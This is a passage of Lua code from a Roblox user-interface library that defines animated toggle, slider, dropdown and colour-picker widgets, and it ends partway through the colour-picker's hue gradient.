            Toggle.Position = UDim2.new(0.215625003, 0, 0.446271926, 0)
            Toggle.Size = UDim2.new(0, 363, 0, 42)
            Toggle.AutoButtonColor = false
            Toggle.Font = Enum.Font.SourceSans
            Toggle.Text = ""
            Toggle.TextColor3 = Color3.fromRGB(0, 0, 0)
            Toggle.TextSize = 14.000

            ToggleCorner.CornerRadius = UDim.new(0, 5)
            ToggleCorner.Name = "ToggleCorner"
            ToggleCorner.Parent = Toggle

            ToggleTitle.Name = "ToggleTitle"
            ToggleTitle.Parent = Toggle
            ToggleTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ToggleTitle.BackgroundTransparency = 1.000
            ToggleTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
            ToggleTitle.Size = UDim2.new(0, 187, 0, 42)
            ToggleTitle.Font = Enum.Font.Gotham
            ToggleTitle.Text = text
            ToggleTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            ToggleTitle.TextSize = 14.000
            ToggleTitle.TextXAlignment = Enum.TextXAlignment.Left
            ToggleTitle.RichText = true
			
            FrameToggle1.Name = "FrameToggle1"
            FrameToggle1.Parent = Toggle
            FrameToggle1.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            FrameToggle1.Position = UDim2.new(0.859504104, 0, 0.285714298, 0)
            FrameToggle1.Size = UDim2.new(0, 37, 0, 18)

            FrameToggle1Corner.Name = "FrameToggle1Corner"
            FrameToggle1Corner.Parent = FrameToggle1

            FrameToggle2.Name = "FrameToggle2"
            FrameToggle2.Parent = FrameToggle1
            FrameToggle2.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            FrameToggle2.Position = UDim2.new(0.0489999987, 0, 0.0930000022, 0)
            FrameToggle2.Size = UDim2.new(0, 33, 0, 14)

            FrameToggle2Corner.Name = "FrameToggle2Corner"
            FrameToggle2Corner.Parent = FrameToggle2

            FrameToggle3.Name = "FrameToggle3"
            FrameToggle3.Parent = FrameToggle1
            FrameToggle3.BackgroundColor3 = PresetColor
            FrameToggle3.BackgroundTransparency = 1.000
            FrameToggle3.Size = UDim2.new(0, 37, 0, 18)

            FrameToggle3Corner.Name = "FrameToggle3Corner"
            FrameToggle3Corner.Parent = FrameToggle3

            FrameToggleCircle.Name = "FrameToggleCircle"
            FrameToggleCircle.Parent = FrameToggle1
            FrameToggleCircle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            FrameToggleCircle.Position = UDim2.new(0.127000004, 0, 0.222000003, 0)
            FrameToggleCircle.Size = UDim2.new(0, 10, 0, 10)

            FrameToggleCircleCorner.Name = "FrameToggleCircleCorner"
            FrameToggleCircleCorner.Parent = FrameToggleCircle

            coroutine.wrap(
                function()
                    while wait() do
                        FrameToggle3.BackgroundColor3 = PresetColor
                    end
                end
            )()

            Toggle.MouseButton1Click:Connect(function()
                    if toggled == false then
                        TweenService:Create(
                            Toggle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundColor3 = Color3.fromRGB(37, 37, 37)}
                        ):Play()
                        TweenService:Create(
                            FrameToggle1,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 1}
                        ):Play()
                        TweenService:Create(
                            FrameToggle2,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 1}
                        ):Play()
                        TweenService:Create(
                            FrameToggle3,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 0}
                        ):Play()
                        TweenService:Create(
                            FrameToggleCircle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundColor3 = Color3.fromRGB(255, 255, 255)}
                        ):Play()
                        FrameToggleCircle:TweenPosition(
                            UDim2.new(0.587, 0, 0.222000003, 0),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )
                    else
                        TweenService:Create(
                            Toggle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundColor3 = Color3.fromRGB(34, 34, 34)}
                        ):Play()
                        TweenService:Create(
                            FrameToggle1,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 0}
                        ):Play()
                        TweenService:Create(
                            FrameToggle2,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 0}
                        ):Play()
                        TweenService:Create(
                            FrameToggle3,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundTransparency = 1}
                        ):Play()
                        TweenService:Create(
                            FrameToggleCircle,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundColor3 = Color3.fromRGB(50, 50, 50)}
                        ):Play()
                        FrameToggleCircle:TweenPosition(
                            UDim2.new(0.127000004, 0, 0.222000003, 0),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )
                    end
                    toggled = not toggled
			task.spawn(function()
				if server.dc == true then
					dcfunc()
				else
					lib:ErrorReader(function()
						callback(toggled)
					end)
				end
			end)
                end
            )

            if default == true then
                TweenService:Create(
                    Toggle,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundColor3 = Color3.fromRGB(37, 37, 37)}
                ):Play()
                TweenService:Create(
                    FrameToggle1,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundTransparency = 1}
                ):Play()
                TweenService:Create(
                    FrameToggle2,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundTransparency = 1}
                ):Play()
                TweenService:Create(
                    FrameToggle3,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundTransparency = 0}
                ):Play()
                TweenService:Create(
                    FrameToggleCircle,
                    TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                    {BackgroundColor3 = Color3.fromRGB(255, 255, 255)}
                ):Play()
                FrameToggleCircle:TweenPosition(
                    UDim2.new(0.587, 0, 0.222000003, 0),
                    Enum.EasingDirection.Out,
                    Enum.EasingStyle.Quart,
                    .2,
                    true
                )
                toggled = not toggled
            end

		function asslabel:EditText(str)
			ToggleTitle.Text = str
		end

		function asslabel:GetValue()
			return toggled
		end
			
		function asslabel:Set(str)
			toggled = str
			if str == false then
				TweenService:Create(Toggle,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(37,37,37)}):Play()
                                 TweenService:Create(FrameToggle1,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
                                 TweenService:Create(FrameToggle2,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
                                 TweenService:Create(FrameToggle3,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 0}):Play()
                                 TweenService:Create(FrameToggleCircle,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(255, 255, 255)}):Play()
                                 FrameToggleCircle:TweenPosition(UDim2.new(0.587,0,0.222000003,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.2,true)
			else
                                 TweenService:Create(Toggle,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(34, 34, 34)}):Play()
                                 TweenService:Create(FrameToggle1,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 0}):Play()
                                 TweenService:Create(FrameToggle2,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 0}):Play()
                                 TweenService:Create(FrameToggle3,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
                                 TweenService:Create(FrameToggleCircle,TweenInfo.new(.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(50, 50, 50)}):Play()
                                 FrameToggleCircle:TweenPosition(UDim2.new(0.127000004,0,0.222000003,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,.2,true)
			end
			lib:ErrorReader(function()
				callback(toggled)
			end)
		end
			
            Tab.CanvasSize = UDim2.new(0,0,0,TabLayout.AbsoluteContentSize.Y)
	    return asslabel
        end
		
        function tabcontent:Slider(text, min, max, start, callback)
            local dragging = false
            local Slider = Instance.new("TextButton")
            local SliderCorner = Instance.new("UICorner")
            local SliderTitle = Instance.new("TextLabel")
            local SliderValue = Instance.new("TextLabel")
            local SlideFrame = Instance.new("Frame")
            local CurrentValueFrame = Instance.new("Frame")
            local SlideCircle = Instance.new("ImageButton")

            Slider.Name = "Slider"
            Slider.Parent = Tab
            Slider.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            Slider.Position = UDim2.new(-0.48035714, 0, -0.570532918, 0)
            Slider.Size = UDim2.new(0, 363, 0, 60)
            Slider.AutoButtonColor = false
            Slider.Font = Enum.Font.SourceSans
            Slider.Text = ""
            Slider.TextColor3 = Color3.fromRGB(0, 0, 0)
            Slider.TextSize = 14.000

            SliderCorner.CornerRadius = UDim.new(0, 5)
            SliderCorner.Name = "SliderCorner"
            SliderCorner.Parent = Slider

            SliderTitle.Name = "SliderTitle"
            SliderTitle.Parent = Slider
            SliderTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            SliderTitle.BackgroundTransparency = 1.000
            SliderTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
            SliderTitle.Size = UDim2.new(0, 187, 0, 42)
            SliderTitle.Font = Enum.Font.Gotham
            SliderTitle.Text = text
            SliderTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            SliderTitle.TextSize = 14.000
            SliderTitle.TextXAlignment = Enum.TextXAlignment.Left
            SliderTitle.RichText = true
			
            SliderValue.Name = "SliderValue"
            SliderValue.Parent = Slider
            SliderValue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            SliderValue.BackgroundTransparency = 1.000
            SliderValue.Position = UDim2.new(0.0358126722, 0, 0, 0)
            SliderValue.Size = UDim2.new(0, 335, 0, 42)
            SliderValue.Font = Enum.Font.Gotham
            SliderValue.Text = tostring(start and math.floor((start / max) * (max - min) + min) or 0)
            SliderValue.TextColor3 = Color3.fromRGB(255, 255, 255)
            SliderValue.TextSize = 14.000
            SliderValue.TextXAlignment = Enum.TextXAlignment.Right

            SlideFrame.Name = "SlideFrame"
            SlideFrame.Parent = Slider
            SlideFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            SlideFrame.BorderSizePixel = 0
            SlideFrame.Position = UDim2.new(0.0342647657, 0, 0.686091602, 0)
            SlideFrame.Size = UDim2.new(0, 335, 0, 3)

            CurrentValueFrame.Name = "CurrentValueFrame"
            CurrentValueFrame.Parent = SlideFrame
            CurrentValueFrame.BackgroundColor3 = PresetColor
            CurrentValueFrame.BorderSizePixel = 0
            CurrentValueFrame.Size = UDim2.new((start or 0) / max, 0, 0, 3)

            SlideCircle.Name = "SlideCircle"
            SlideCircle.Parent = SlideFrame
            SlideCircle.BackgroundColor3 = PresetColor
            SlideCircle.BackgroundTransparency = 1.000
            SlideCircle.Position = UDim2.new((start or 0) / max, -6, -1.30499995, 0)
            SlideCircle.Size = UDim2.new(0, 11, 0, 11)
            SlideCircle.Image = "rbxassetid://3570695787"
            SlideCircle.ImageColor3 = PresetColor

            coroutine.wrap(
                function()
                    while wait() do
                        CurrentValueFrame.BackgroundColor3 = PresetColor
                        SlideCircle.ImageColor3 = PresetColor
                    end
                end
            )()

            local function move(input)
                local pos =
                    UDim2.new(
                    math.clamp((input.Position.X - SlideFrame.AbsolutePosition.X) / SlideFrame.AbsoluteSize.X, 0, 1),
                    -6,
                    -1.30499995,
                    0
                )
                local pos1 =
                    UDim2.new(
                    math.clamp((input.Position.X - SlideFrame.AbsolutePosition.X) / SlideFrame.AbsoluteSize.X, 0, 1),
                    0,
                    0,
                    3
                )
                CurrentValueFrame:TweenSize(pos1, "Out", "Sine", 0.1, true)
                SlideCircle:TweenPosition(pos, "Out", "Sine", 0.1, true)
                local value = math.floor(((pos.X.Scale * max) / max) * (max - min) + min)
                SliderValue.Text = tostring(value)
                pcall(callback, value)
            end
            SlideCircle.InputBegan:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
                        dragging = true
                    end
                end
            )
            SlideCircle.InputEnded:Connect(
                function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
                        dragging = false
                    end
                end
            )
            game:GetService("UserInputService").InputChanged:Connect(
                function(input)
                    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
                        move(input)
                    end
                end
            )
            Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
        end
        function tabcontent:Dropdown(text, list, callback)
            local droptog = false
            local framesize = 0
            local itemcount = 0
            local ahhts = {}
			
            local Dropdown = Instance.new("Frame")
            local DropdownCorner = Instance.new("UICorner")
            local DropdownBtn = Instance.new("TextButton")
            local DropdownTitle = Instance.new("TextLabel")
            local ArrowImg = Instance.new("ImageLabel")
            local DropItemHolder = Instance.new("ScrollingFrame")
            local DropLayout = Instance.new("UIListLayout")

            Dropdown.Name = "Dropdown"
            Dropdown.Parent = Tab
            Dropdown.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            Dropdown.ClipsDescendants = true
            Dropdown.Position = UDim2.new(-0.541071415, 0, -0.532915354, 0)
            Dropdown.Size = UDim2.new(0, 363, 0, 42)

            DropdownCorner.CornerRadius = UDim.new(0, 5)
            DropdownCorner.Name = "DropdownCorner"
            DropdownCorner.Parent = Dropdown

            DropdownBtn.Name = "DropdownBtn"
            DropdownBtn.Parent = Dropdown
            DropdownBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            DropdownBtn.BackgroundTransparency = 1.000
            DropdownBtn.Size = UDim2.new(0, 363, 0, 42)
            DropdownBtn.Font = Enum.Font.SourceSans
            DropdownBtn.Text = ""
            DropdownBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
            DropdownBtn.TextSize = 14.000

            DropdownTitle.Name = "DropdownTitle"
            DropdownTitle.Parent = Dropdown
            DropdownTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            DropdownTitle.BackgroundTransparency = 1.000
            DropdownTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
            DropdownTitle.Size = UDim2.new(0, 187, 0, 42)
            DropdownTitle.Font = Enum.Font.Gotham
            DropdownTitle.Text = text
            DropdownTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            DropdownTitle.TextSize = 14.000
            DropdownTitle.TextXAlignment = Enum.TextXAlignment.Left
            DropdownTitle.RichText = true
			
            ArrowImg.Name = "ArrowImg"
            ArrowImg.Parent = DropdownTitle
            ArrowImg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ArrowImg.BackgroundTransparency = 1.000
            ArrowImg.Position = UDim2.new(1.65240645, 0, 0.190476194, 0)
            ArrowImg.Size = UDim2.new(0, 26, 0, 26)
            ArrowImg.Image = "http://www.roblox.com/asset/?id=6034818375"

            DropItemHolder.Name = "DropItemHolder"
            DropItemHolder.Parent = DropdownTitle
            DropItemHolder.Active = true
            DropItemHolder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            DropItemHolder.BackgroundTransparency = 1.000
            DropItemHolder.BorderSizePixel = 0
            DropItemHolder.Position = UDim2.new(-0.00400000019, 0, 1.04999995, 0)
            DropItemHolder.Size = UDim2.new(0, 342, 0, 0)
            DropItemHolder.CanvasSize = UDim2.new(0, 0, 0, 0)
            DropItemHolder.ScrollBarThickness = 3

            DropLayout.Name = "DropLayout"
            DropLayout.Parent = DropItemHolder
            DropLayout.SortOrder = Enum.SortOrder.LayoutOrder

            DropdownBtn.MouseButton1Click:Connect(
                function()
                    if droptog == false then
                        Dropdown:TweenSize(
                            UDim2.new(0, 363, 0, 55 + framesize),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )
                        TweenService:Create(
                            ArrowImg,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {Rotation = 270}
                        ):Play()
                        wait(.2)
                        Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
                    else
                        Dropdown:TweenSize(
                            UDim2.new(0, 363, 0, 42),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )
                        TweenService:Create(
                            ArrowImg,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {Rotation = 0}
                        ):Play()
                        wait(.2)
                        Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
                    end
                    droptog = not droptog
                end
            )

            for i, v in next, list do
                itemcount = itemcount + 1
                if itemcount <= 3 then
                    framesize = framesize + 26
                    DropItemHolder.Size = UDim2.new(0, 342, 0, framesize)
                end
                local Item = Instance.new("TextButton")
                local ItemCorner = Instance.new("UICorner")

                Item.Name = "Item"
                Item.Parent = DropItemHolder
                Item.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
                Item.ClipsDescendants = true
                Item.Size = UDim2.new(0, 335, 0, 25)
                Item.AutoButtonColor = false
                Item.Font = Enum.Font.Gotham
                Item.Text = v
                Item.TextColor3 = Color3.fromRGB(255, 255, 255)
                Item.TextSize = 15.000
                Item.RichText = true
				
                ItemCorner.CornerRadius = UDim.new(0, 4)
                ItemCorner.Name = "ItemCorner"
                ItemCorner.Parent = Item

                Item.MouseEnter:Connect(
                    function()
                        TweenService:Create(
                            Item,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundColor3 = Color3.fromRGB(37, 37, 37)}
                        ):Play()
                    end
                )

                Item.MouseLeave:Connect(
                    function()
                        TweenService:Create(
                            Item,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {BackgroundColor3 = Color3.fromRGB(34, 34, 34)}
                        ):Play()
                    end
                )

                Item.MouseButton1Click:Connect(
                    function()
                        droptog = not droptog
                        DropdownTitle.Text = text .. " - " .. v
                        pcall(callback, v)
                        Dropdown:TweenSize(
                            UDim2.new(0, 363, 0, 42),
                            Enum.EasingDirection.Out,
                            Enum.EasingStyle.Quart,
                            .2,
                            true
                        )
                        TweenService:Create(
                            ArrowImg,
                            TweenInfo.new(.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                            {Rotation = 0}
                        ):Play()
                        wait(.2)
                        Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
                    end
                )

                DropItemHolder.CanvasSize = UDim2.new(0, 0, 0, DropLayout.AbsoluteContentSize.Y)
            end

		function ahhts:EditText(str)
			DropdownTitle.Text = str
		end
			
            Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
		return ahhts
        end
        function tabcontent:Colorpicker(text, preset, callback)
            local ColorPickerToggled = false
            local OldToggleColor = Color3.fromRGB(0, 0, 0)
            local OldColor = Color3.fromRGB(0, 0, 0)
            local OldColorSelectionPosition = nil
            local OldHueSelectionPosition = nil
            local ColorH, ColorS, ColorV = 1, 1, 1
            local RainbowColorPicker = false
            local ColorPickerInput = nil
            local ColorInput = nil
            local HueInput = nil

            local Colorpicker = Instance.new("Frame")
            local ColorpickerCorner = Instance.new("UICorner")
            local ColorpickerTitle = Instance.new("TextLabel")
            local BoxColor = Instance.new("Frame")
            local BoxColorCorner = Instance.new("UICorner")
            local ConfirmBtn = Instance.new("TextButton")
            local ConfirmBtnCorner = Instance.new("UICorner")
            local ConfirmBtnTitle = Instance.new("TextLabel")
            local ColorpickerBtn = Instance.new("TextButton")
            local RainbowToggle = Instance.new("TextButton")
            local RainbowToggleCorner = Instance.new("UICorner")
            local RainbowToggleTitle = Instance.new("TextLabel")
            local FrameRainbowToggle1 = Instance.new("Frame")
            local FrameRainbowToggle1Corner = Instance.new("UICorner")
            local FrameRainbowToggle2 = Instance.new("Frame")
            local FrameRainbowToggle2_2 = Instance.new("UICorner")
            local FrameRainbowToggle3 = Instance.new("Frame")
            local FrameToggle3 = Instance.new("UICorner")
            local FrameRainbowToggleCircle = Instance.new("Frame")
            local FrameRainbowToggleCircleCorner = Instance.new("UICorner")
            local Color = Instance.new("ImageLabel")
            local ColorCorner = Instance.new("UICorner")
            local ColorSelection = Instance.new("ImageLabel")
            local Hue = Instance.new("ImageLabel")
            local HueCorner = Instance.new("UICorner")
            local HueGradient = Instance.new("UIGradient")
            local HueSelection = Instance.new("ImageLabel")

            Colorpicker.Name = "Colorpicker"
            Colorpicker.Parent = Tab
            Colorpicker.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            Colorpicker.ClipsDescendants = true
            Colorpicker.Position = UDim2.new(-0.541071415, 0, -0.532915354, 0)
            Colorpicker.Size = UDim2.new(0, 363, 0, 42)

            ColorpickerCorner.CornerRadius = UDim.new(0, 5)
            ColorpickerCorner.Name = "ColorpickerCorner"
            ColorpickerCorner.Parent = Colorpicker

            ColorpickerTitle.Name = "ColorpickerTitle"
            ColorpickerTitle.Parent = Colorpicker
            ColorpickerTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ColorpickerTitle.BackgroundTransparency = 1.000
            ColorpickerTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
            ColorpickerTitle.Size = UDim2.new(0, 187, 0, 42)
            ColorpickerTitle.Font = Enum.Font.Gotham
            ColorpickerTitle.Text = text
            ColorpickerTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            ColorpickerTitle.TextSize = 14.000
            ColorpickerTitle.TextXAlignment = Enum.TextXAlignment.Left
            ColorpickerTitle.RichText = true
			
            BoxColor.Name = "BoxColor"
            BoxColor.Parent = ColorpickerTitle
            BoxColor.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
            BoxColor.Position = UDim2.new(1.60427809, 0, 0.214285716, 0)
            BoxColor.Size = UDim2.new(0, 41, 0, 23)

            BoxColorCorner.CornerRadius = UDim.new(0, 5)
            BoxColorCorner.Name = "BoxColorCorner"
            BoxColorCorner.Parent = BoxColor

            ConfirmBtn.Name = "ConfirmBtn"
            ConfirmBtn.Parent = ColorpickerTitle
            ConfirmBtn.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            ConfirmBtn.Position = UDim2.new(1.25814295, 0, 1.09037197, 0)
            ConfirmBtn.Size = UDim2.new(0, 105, 0, 32)
            ConfirmBtn.AutoButtonColor = false
            ConfirmBtn.Font = Enum.Font.SourceSans
            ConfirmBtn.Text = ""
            ConfirmBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
            ConfirmBtn.TextSize = 14.000

            ConfirmBtnCorner.CornerRadius = UDim.new(0, 5)
            ConfirmBtnCorner.Name = "ConfirmBtnCorner"
            ConfirmBtnCorner.Parent = ConfirmBtn

            ConfirmBtnTitle.Name = "ConfirmBtnTitle"
            ConfirmBtnTitle.Parent = ConfirmBtn
            ConfirmBtnTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ConfirmBtnTitle.BackgroundTransparency = 1.000
            ConfirmBtnTitle.Size = UDim2.new(0, 33, 0, 32)
            ConfirmBtnTitle.Font = Enum.Font.Gotham
            ConfirmBtnTitle.Text = "Confirm"
            ConfirmBtnTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            ConfirmBtnTitle.TextSize = 14.000
            ConfirmBtnTitle.TextXAlignment = Enum.TextXAlignment.Left

            ColorpickerBtn.Name = "ColorpickerBtn"
            ColorpickerBtn.Parent = ColorpickerTitle
            ColorpickerBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ColorpickerBtn.BackgroundTransparency = 1.000
            ColorpickerBtn.Size = UDim2.new(0, 363, 0, 42)
            ColorpickerBtn.Font = Enum.Font.SourceSans
            ColorpickerBtn.Text = ""
            ColorpickerBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
            ColorpickerBtn.TextSize = 14.000

            RainbowToggle.Name = "RainbowToggle"
            RainbowToggle.Parent = ColorpickerTitle
            RainbowToggle.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            RainbowToggle.Position = UDim2.new(1.26349044, 0, 2.12684202, 0)
            RainbowToggle.Size = UDim2.new(0, 104, 0, 32)
            RainbowToggle.AutoButtonColor = false
            RainbowToggle.Font = Enum.Font.SourceSans
            RainbowToggle.Text = ""
            RainbowToggle.TextColor3 = Color3.fromRGB(0, 0, 0)
            RainbowToggle.TextSize = 14.000

            RainbowToggleCorner.CornerRadius = UDim.new(0, 5)
            RainbowToggleCorner.Name = "RainbowToggleCorner"
            RainbowToggleCorner.Parent = RainbowToggle

            RainbowToggleTitle.Name = "RainbowToggleTitle"
            RainbowToggleTitle.Parent = RainbowToggle
            RainbowToggleTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            RainbowToggleTitle.BackgroundTransparency = 1.000
            RainbowToggleTitle.Size = UDim2.new(0, 33, 0, 32)
            RainbowToggleTitle.Font = Enum.Font.Gotham
            RainbowToggleTitle.Text = "Rainbow"
            RainbowToggleTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            RainbowToggleTitle.TextSize = 14.000
            RainbowToggleTitle.TextXAlignment = Enum.TextXAlignment.Left

            FrameRainbowToggle1.Name = "FrameRainbowToggle1"
            FrameRainbowToggle1.Parent = RainbowToggle
            FrameRainbowToggle1.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            FrameRainbowToggle1.Position = UDim2.new(0.649999976, 0, 0.186000004, 0)
            FrameRainbowToggle1.Size = UDim2.new(0, 37, 0, 18)

            FrameRainbowToggle1Corner.Name = "FrameRainbowToggle1Corner"
            FrameRainbowToggle1Corner.Parent = FrameRainbowToggle1

            FrameRainbowToggle2.Name = "FrameRainbowToggle2"
            FrameRainbowToggle2.Parent = FrameRainbowToggle1
            FrameRainbowToggle2.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            FrameRainbowToggle2.Position = UDim2.new(0.0590000004, 0, 0.112999998, 0)
            FrameRainbowToggle2.Size = UDim2.new(0, 33, 0, 14)

            FrameRainbowToggle2_2.Name = "FrameRainbowToggle2"
            FrameRainbowToggle2_2.Parent = FrameRainbowToggle2

            FrameRainbowToggle3.Name = "FrameRainbowToggle3"
            FrameRainbowToggle3.Parent = FrameRainbowToggle1
            FrameRainbowToggle3.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            FrameRainbowToggle3.BackgroundTransparency = 1.000
            FrameRainbowToggle3.Size = UDim2.new(0, 37, 0, 18)

            FrameToggle3.Name = "FrameToggle3"
            FrameToggle3.Parent = FrameRainbowToggle3

            FrameRainbowToggleCircle.Name = "FrameRainbowToggleCircle"
            FrameRainbowToggleCircle.Parent = FrameRainbowToggle1
            FrameRainbowToggleCircle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            FrameRainbowToggleCircle.Position = UDim2.new(0.127000004, 0, 0.222000003, 0)
            FrameRainbowToggleCircle.Size = UDim2.new(0, 10, 0, 10)

            FrameRainbowToggleCircleCorner.Name = "FrameRainbowToggleCircleCorner"
            FrameRainbowToggleCircleCorner.Parent = FrameRainbowToggleCircle

            Color.Name = "Color"
            Color.Parent = ColorpickerTitle
            Color.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
            Color.Position = UDim2.new(0, 0, 0, 42)
            Color.Size = UDim2.new(0, 194, 0, 80)
            Color.ZIndex = 10
            Color.Image = "rbxassetid://4155801252"

            ColorCorner.CornerRadius = UDim.new(0, 3)
            ColorCorner.Name = "ColorCorner"
            ColorCorner.Parent = Color

            ColorSelection.Name = "ColorSelection"
            ColorSelection.Parent = Color
            ColorSelection.AnchorPoint = Vector2.new(0.5, 0.5)
            ColorSelection.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ColorSelection.BackgroundTransparency = 1.000
            ColorSelection.Position = UDim2.new(preset and select(3, Color3.toHSV(preset)))
            ColorSelection.Size = UDim2.new(0, 18, 0, 18)
            ColorSelection.Image = "http://www.roblox.com/asset/?id=4805639000"
            ColorSelection.ScaleType = Enum.ScaleType.Fit
            ColorSelection.Visible = false

            Hue.Name = "Hue"
            Hue.Parent = ColorpickerTitle
            Hue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Hue.Position = UDim2.new(0, 202, 0, 42)
            Hue.Size = UDim2.new(0, 25, 0, 80)

            HueCorner.CornerRadius = UDim.new(0, 3)
            HueCorner.Name = "HueCorner"
            HueCorner.Parent = Hue

            HueGradient.Color =
                ColorSequence.new {
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 4)),
                ColorSequenceKeypoint.new(0.20, Color3.fromRGB(234, 255, 0)),
                ColorSequenceKeypoint.new(0.40, Color3.fromRGB(21, 255, 0)),
                ColorSequenceKeypoint.new(0.60, Color3.fromRGB(0, 255, 255)),
                ColorSequenceKeypoint.new(0.80, Color3.fromRGB(0, 17, 255)),
                ColorSequenceKeypoint.new(0.90, Color3.fromRGB(255, 0, 251)),
